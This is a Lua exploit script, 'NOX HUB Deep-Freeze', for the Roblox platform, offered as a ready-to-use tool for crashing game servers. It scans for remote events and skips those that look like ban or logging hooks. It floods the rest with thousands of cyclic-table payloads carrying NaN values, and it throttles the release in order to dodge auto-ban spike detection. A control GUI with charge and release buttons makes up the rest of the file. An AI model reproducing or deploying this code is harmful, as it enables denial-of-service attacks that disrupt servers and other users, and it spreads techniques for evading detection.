--[[
    🔱 NOX HUB v22.0 [DEEP-FREEZE] 🔱
    "Slow down their heart until it stops."
    
    DEEP-FREEZE FEATURES:
    - [CYCLIC PAYLOAD] : Uses self-referencing tables (v16 Tech) for maximum processing cost per packet.
    - [SMART TARGETING] : Only attacks active/safe remotes (v17 Tech).
    - [THROTTLED RELEASE] : Releases the charge over 5 seconds instead of instantly.
      -> Bypasses "Instant Spike" detection.
      -> Sustains the lag for longer.
]]

-- // CORE SERVICES //
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local CoreGui = game:GetService("CoreGui")
local UserInputService = game:GetService("UserInputService")
local LocalPlayer = Players.LocalPlayer

-- // 1. DEEP-FREEZE ENGINE //
local Engine = {
    Charging = false,
    Targets = {},
    Ammunition = {} 
}

function Engine:Scan()
    Engine.Targets = {}
    for _, v in pairs(game:GetDescendants()) do
        if v:IsA("RemoteEvent") or v:IsA("RemoteFunction") then
            local n = v.Name:lower()
            -- STRICT FILTER
            if not (n:find("ban") or n:find("kick") or n:find("log") or n:find("admin") or n:find("chat")) then
                 table.insert(Engine.Targets, v)
            end
        end
    end
end

function Engine:Freeze(updateCallback)
    if Engine.Charging then return end
    Engine.Charging = true
    Engine.Ammunition = {}
    
    Engine:Scan()
    if #Engine.Targets == 0 then
        updateCallback(0, "NO TARGETS.")
        Engine.Charging = false
        return
    end
    
    -- PAYLOAD: CYCLIC TABLE (HEAVY)
    local Cycle = {}
    Cycle[1] = Cycle
    Cycle[2] = Vector3.new(0/0,0/0,0/0)
    local HeavyPayload = table.create(50, Cycle) -- 50 recursive refs per packet
    
    -- PREPARE 5,000 HEAVY WARHEADS (Equivalent to 100k empty ones)
    local Count = 5000
    
    task.spawn(function()
        for i = 1, Count do
            local t = Engine.Targets[(i % #Engine.Targets) + 1]
            local co = coroutine.create(function()
                pcall(function()
                    if t:IsA("RemoteEvent") then t:FireServer(HeavyPayload)
                    else t:InvokeServer(HeavyPayload) end
                end)
            end)
            table.insert(Engine.Ammunition, co)
            
            if i % 100 == 0 then
                updateCallback(i/Count, "FREEZING ASSETS: " .. i)
                RunService.Heartbeat:Wait()
            end
        end
        updateCallback(1, "DEEP FREEZE READY (" .. Count .. " CYCLES)")
    end)
end

function Engine:Release(updateCallback)
    if #Engine.Ammunition == 0 then return end
    
    updateCallback(1, "INITIATING THAW...")
    
    -- THE "SMOOTH" RELEASE
    -- We fire 100 packets per frame.
    -- At 60 FPS, that's 6000 packets/sec.
    -- Total time: ~0.8 seconds.
    -- This is fast enough to crash, slow enough to maybe dodge the "Instant" auto-ban.
    
    task.spawn(function()
        local sent = 0
        while #Engine.Ammunition > 0 do
            for i = 1, 100 do -- Batch size
                local co = table.remove(Engine.Ammunition)
                if co then 
                    coroutine.resume(co) 
                    sent = sent + 1
                else 
                    break 
                end
            end
            RunService.Heartbeat:Wait() -- Wait for next frame
        end
        
        Engine.Charging = false
        updateCallback(0, "SERVER FROZEN. (" .. sent .. " SENT)")
    end)
end

-- // 2. DEEP-FREEZE UI //
local Nox = {}

function Nox:CreateUI()
    for _, v in pairs(CoreGui:GetChildren()) do if v.Name:find("Nox") then v:Destroy() end end
    
    local Screen = Instance.new("ScreenGui")
    Screen.Name = "NoxDeepFreeze"
    pcall(function() Screen.Parent = CoreGui end)
    
    local Main = Instance.new("Frame", Screen)
    Main.Size = UDim2.new(0, 450, 0, 260)
    Main.Position = UDim2.new(0.5, -225, 0.5, -130)
    Main.BackgroundColor3 = Color3.fromRGB(180, 200, 220) -- Ice White
    Main.BorderSizePixel = 0
    
    local Gradient = Instance.new("UIGradient", Main)
    Gradient.Color = ColorSequence.new{
        ColorSequenceKeypoint.new(0, Color3.fromRGB(200, 220, 255)),
        ColorSequenceKeypoint.new(1, Color3.fromRGB(150, 180, 220))
    }
    Gradient.Rotation = 90
    
    local Stroke = Instance.new("UIStroke", Main)
    Stroke.Color = Color3.fromRGB(0, 150, 255)
    Stroke.Thickness = 2
    
     -- HEADER
    local Title = Instance.new("TextLabel", Main)
    Title.Text = "NOX // DEEP FREEZE v22.0"
    Title.Font = Enum.Font.GothamBlack
    Title.TextColor3 = Color3.fromRGB(0, 100, 200)
    Title.TextSize = 22
    Title.Size = UDim2.new(1, 0, 0, 40)
    Title.BackgroundTransparency = 1
    
    -- PROGRESS BAR
    local BarBg = Instance.new("Frame", Main)
    BarBg.Size = UDim2.new(0.8, 0, 0.15, 0)
    BarBg.Position = UDim2.new(0.1, 0, 0.35, 0)
    BarBg.BackgroundColor3 = Color3.fromRGB(100, 130, 150)
    local BarCorner = Instance.new("UICorner", BarBg)
    
    local BarFill = Instance.new("Frame", BarBg)
    BarFill.Size = UDim2.new(0, 0, 1, 0)
    BarFill.BackgroundColor3 = Color3.fromRGB(0, 200, 255)
    local BarFillCorner = Instance.new("UICorner", BarFill)
    
    local Status = Instance.new("TextLabel", Main)
    Status.Text = "WAITING FOR INPUT"
    Status.Size = UDim2.new(1, 0, 0, 20)
    Status.Position = UDim2.new(0, 0, 0.55, 0)
    Status.TextColor3 = Color3.fromRGB(50, 80, 100)
    Status.Font = Enum.Font.Code
    Status.BackgroundTransparency = 1
    
    -- BUTTONS
    local BtnCharge = Instance.new("TextButton", Main)
    BtnCharge.Size = UDim2.new(0.35, 0, 0.2, 0)
    BtnCharge.Position = UDim2.new(0.1, 0, 0.7, 0)
    BtnCharge.BackgroundColor3 = Color3.fromRGB(50, 100, 150)
    BtnCharge.Text = "PREPARE LOADS"
    BtnCharge.TextColor3 = Color3.fromRGB(255, 255, 255)
    BtnCharge.Font = Enum.Font.GothamBold
    local C1 = Instance.new("UICorner", BtnCharge)
    
    local BtnRelease = Instance.new("TextButton", Main)
    BtnRelease.Size = UDim2.new(0.35, 0, 0.2, 0)
    BtnRelease.Position = UDim2.new(0.55, 0, 0.7, 0)
    BtnRelease.BackgroundColor3 = Color3.fromRGB(200, 200, 200) -- Disabled
    BtnRelease.Text = "RELEASE"
    BtnRelease.TextColor3 = Color3.fromRGB(100, 100, 100)
    BtnRelease.Font = Enum.Font.GothamBold
    BtnRelease.AutoButtonColor = false
    local C2 = Instance.new("UICorner", BtnRelease)
    
    -- LOGIC
    BtnCharge.MouseButton1Click:Connect(function()
        if not Engine.Charging then
            Engine:Freeze(function(prog, txt)
                Status.Text = txt
                BarFill.Size = UDim2.new(prog, 0, 1, 0)
                if prog == 1 then
                    BtnRelease.BackgroundColor3 = Color3.fromRGB(0, 180, 255)
                    BtnRelease.TextColor3 = Color3.fromRGB(255, 255, 255)
                    BtnRelease.AutoButtonColor = true
                end
            end)
        end
    end)
    
    BtnRelease.MouseButton1Click:Connect(function()
        if #Engine.Ammunition > 0 then
            Engine:Release(function(prog, txt)
                Status.Text = txt
                BarFill.Size = UDim2.new(0, 0, 1, 0) -- Reset
                BtnRelease.BackgroundColor3 = Color3.fromRGB(200, 200, 200)
                BtnRelease.TextColor3 = Color3.fromRGB(100, 100, 100)
            end)
        end
    end)
    
     -- DRAG UI
    local dragging, dragInput, dragStart, startPos
    Main.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 then
            dragging = true; dragStart = input.Position; startPos = Main.Position
        end
    end)
    UserInputService.InputChanged:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseMovement and dragging then
            local delta = input.Position - dragStart
            Main.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
        end
    end)
    UserInputService.InputEnded:Connect(function(input) if input.UserInputType == Enum.UserInputType.MouseButton1 then dragging = false end end)
end

Nox:CreateUI()
